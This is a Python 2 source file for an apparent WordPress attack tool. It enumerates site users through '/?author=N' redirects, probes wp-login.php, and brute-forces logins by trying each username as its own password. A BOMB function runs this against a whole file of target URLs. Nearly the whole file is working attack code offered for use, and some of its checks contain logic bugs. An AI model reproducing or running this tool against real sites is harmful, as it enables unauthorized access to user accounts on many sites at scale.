import requests
from bs4 import BeautifulSoup
import re
import WP_Const as const
successUrl = []


class Wordpress:

    def __init__(self,url):
        self.url = url
        self.SmartUrlExtender()
        self.cookie = const.cookie
        self.data = const.data
        self.log = []
        self.pwd = []
        self.ContinueAttack = True
        print const.startTestingReport(self.url)
        
    def SmartUrlExtender(self):
        self.ckUrlCompletion()
        self.loginUrl = self.url + const.wpLogSuffix
        self.readmeUrl = self.url + const.wpInfoSuffix
        
    def ckUrlCompletion(self):
        if "http://" not in self.url:
            self.url = "http://" + self.url
        
    def ckLoginPgAccess(self):
        if self.ContinueAttack:
            try:
                #Checks if the wp-login.php page is forbidden to access OR No Username retrieved
                if self.getResp(self.loginUrl).status_code is (403 or 404) or len(self.log) is 0:
                    self.ContinueAttack = False
                else:
                    self.ContinueAttack = True
            except requests.ConnectionError:
                self.ContinueAttack = False
                print const.ConnErrCkLogPg
                
    def ifLoggedIn(self,pg):
            if ("wp-submit" or "error" or "Log In" or "Forbidden") in pg:
                return False
            return True
                
    def getResp(self,url,datas=None,cookie=None,time=None,redirect=True):
        return requests.get(
        	url,
        	data=datas,
        	cookies=cookie,
        	allow_redirects=redirect,
        	verify=False,
        	timeout=time) 
    
    def attemptLogin(self,log,pwd):
        self.data["log"] = log
        self.data["pwd"] = pwd
        try:
            response = self.getResp(self.loginUrl,self.data,self.cookie)
            print const.sign_BruteStarts
            if (self.ifLoggedIn(response.content) is False):
                #Failed Login
                print const.sign_MISS
            else:
                #Success Login(?)
                print const.sign_HIT
                print const.AccountReport(self.data)               
                successUrl.append(self.loginUrl)
        except requests.ConnectionError:
            print const.ConnErrBrute
            
    def UserEnum(self):
        num = 1
        cont = True
        while cont:
            try:
                response = self.getResp(self.url+"/?author="+str(num),redirect=False)
            except requests.ConnectionError:
                #No Attack when connection is down
                self.ContinueAttack = False
                print const.ConnErrEnum
                break
            if response.status_code == 301:     #If there exists a 301, this means there exists an user, if no 301, this would be a 404.
                author = response.headers["Location"]
            else:
                author = ""
            if "/author/" not in author:        #If no more username can be enumerated
                cont = False
                print const.userEnumReport(len(self.log))
            else:
                nameResult = re.findall(re.compile(const.authorRE,re.DOTALL),author)
                if len(nameResult) > 0:
                    author = nameResult[0]
                    print const.userFoundReport(author)
                    self.log.append(author)
                    num = num + 1
                else:
                    self.ContinueAttack = False
                    print const.sign_zeroUser
                    break
        
    def bruteForce(self):
        #Don't Brute Force if there is a 403 or 0 Users
        if self.ContinueAttack:
            for order in range(0,len(self.log)):
                #Try USER & PWD as the usernames
                self.attemptLogin(self.log[order],self.log[order])
        else:
        	print const.sign_NoFurtherAttack

def FIRE(url):
    target = Wordpress(url)
    target.UserEnum()
    target.ckLoginPgAccess()
    target.bruteForce()
    target = None
    
def BOMB(fnm_url,fnm_pwd = None):
    num = 1
    with open(fnm_url) as furl:
        urlPool = furl.readlines()
    furl.close()
    if fnm_pwd is not None:
        with open(fnm_pwd) as fpwd:
    	    pwdPool = fpwd.readlines()
    	    fpwd.close()
    for url in urlPool:
        print const.BombStartReport(num)
        FIRE(url.replace("\n",""))       #Get rid of the new line character, which causes ConnectionError
        num = num+1